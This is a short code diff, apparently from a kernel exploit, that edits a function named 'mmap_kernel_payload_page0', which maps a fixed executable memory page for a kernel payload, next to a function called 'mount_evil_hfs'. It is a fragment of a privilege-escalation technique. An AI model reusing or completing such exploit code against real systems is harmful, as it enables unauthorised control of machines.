@@ -84,7 +84,7 @@ void mount_evil_hfs() {
 
 void mmap_kernel_payload_page0() {
 	unsigned int *mmap_addr;
-	void* addr = (void *) 0x0;
+	void* addr = (void *) 0x10000;
 	size_t length = 0x1000;
 
 	mmap_addr = mmap(addr, length, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);	
